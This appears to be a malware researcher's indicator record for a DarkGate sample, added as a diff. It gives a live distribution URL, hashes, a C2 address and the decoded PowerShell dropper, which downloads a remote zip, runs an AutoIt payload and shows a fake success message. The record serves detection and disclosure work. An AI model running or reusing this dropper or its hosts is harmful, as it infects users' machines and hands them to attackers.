@@ -1,0 +1,74 @@
+27.05.2024 | Darkgate | x6x6x7x77xx6x6x67
+
+*************************************************
+
+.url https://kostumn1.ilabserver.com/1.zip
+.ps1 d28c416add7fe55e7b1a20e30013e870cfb2eb3c9a5962ed4047766a43fa4f5e
+.zip 5316fc2cb4c54ba46a42e77e9ee387d158f0f3dc7456a0c549f9718b081c6c26
+
+https://tria.ge/240527-svdsbagh2v/behavioral2
+
+*************************************************
+
+# powershell snippet 0
+ipconfig / flushdns
+$base64 = "$vp = "https://kostumn1.ilabserver.com/1.zip";
+$be = "c:\\downloads";
+New-Item -ItemType Directory -Force -Path $be;
+Invoke-WebRequest -Uri $vp -OutFile $be\TU.zip;
+Clear-Host;
+Expand-Archive $be\TU.zip -Force -destinationpath $be;
+Remove-Item -Path $be\TU.zip;
+Start-Process $be\Autoit3.exe $be\script.a3x
+[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
+[System.Windows.Forms.MessageBox]::Show("The operation completed successfully, please reload the page", "System", 0, 64);
+Clear-Host;"
+invoke-expression "$vp = \"https://kostumn1.ilabserver.com/1.zip\";\r\n$be = \"c:\\\\downloads\";\r\nNew-Item -ItemType Directory -Force -Path $be;\r\nInvoke-WebRequest -Uri $vp -OutFile $be\\TU.zip;\r\nClear-Host;\r\nExpand-Archive $be\\TU.zip -Force -destinationpath $be;\r\nRemove-Item -Path $be\\TU.zip;\r\nStart-Process $be\\Autoit3.exe $be\\script.a3x\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\");\r\n[System.Windows.Forms.MessageBox]::Show(\"The operation completed successfully, please reload the page\", \"System\", 0, 64);\r\nClear-Host;\r\n"
+set-clipboard -value "   "
+exit
+# powershell snippet 1
+$vp = "https://kostumn1.ilabserver.com/1.zip"
+$be = "c:\\\\downloads"
+new-item -itemtype directory -force -path $be
+invoke-webrequest -uri $vp -outfile $be
+tu.zip
+clear-host
+expand-archive "c:\\\\downloads"
+tu.zip()
+("c:\\\\downloads")
+remove-item -path $be
+tu.zip
+start-process "c:\\\\downloads"
+autoit3.exe()
+script.a3x
+[system.reflection.assembly]::loadwithpartialname("System.Windows.Forms")
+[system.windows.forms.messagebox]::show("The operation completed successfully, please reload the page", "System", 0, 64)
+clear-host
+
+*************************************************
+
+Exec
+
+.ps1 > url > zip > au3 > exe
+
+powershell.exe -ExecutionPolicy bypass -File C:\Users\Admin\AppData\Local\Temp\oxi.ps1
+
+ipconfig.exe /flushdns
+
+Autoit3.exe c:\\downloads\script.a3x 
+
+cmd.exe /c wmic ComputerSystem get domain > C:\ProgramData\dekedbh\bggaddh
+
+wmic  ComputerSystem get domain 
+
+*************************************************
+
+distro urls
+
+https://kostumn1.ilabserver.com/1.zip
+
+*************************************************
+
+c2
+
+https://91.222.173.113:443
